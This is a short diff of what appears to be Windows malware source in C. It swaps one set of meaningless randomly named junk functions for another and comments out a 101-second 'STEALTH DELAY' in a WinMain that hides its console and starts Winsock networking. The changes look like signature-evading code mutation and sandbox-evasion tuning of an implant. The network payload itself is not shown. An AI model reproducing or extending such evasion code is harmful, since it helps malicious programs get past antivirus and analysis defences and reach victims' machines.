@@ -6,37 +6,37 @@
 #pragma comment(lib, "ws2_32.lib")
 
 
-void eVQEVHqP() {
-    int x = 464;
-    int y = 320;
+void RkPUFioA() {
+    int x = 861;
+    int y = 280;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-void KcWyhlNs() {
-    int x = 52;
-    int y = 391;
+void keytVVxt() {
+    int x = 209;
+    int y = 41;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-void GRdnEAWs() {
-    int x = 931;
-    int y = 906;
+void aWEZxGIw() {
+    int x = 898;
+    int y = 673;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-void CHhSKRUv() {
-    int x = 899;
-    int y = 153;
+void RJBoZsgD() {
+    int x = 677;
+    int y = 645;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-void IQuSrIUT() {
-    int x = 903;
-    int y = 816;
+void QKdBqPEH() {
+    int x = 952;
+    int y = 517;
     if (x + y > 2000) { printf("%d", x); }
 }
 
@@ -45,7 +45,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     FreeConsole();
     // STEALTH DELAY (101 Seconds)
-    Sleep(101000); 
+    // Sleep(101000); 
 
     // WINSOCK STARTUP
     WSADATA wsaData;
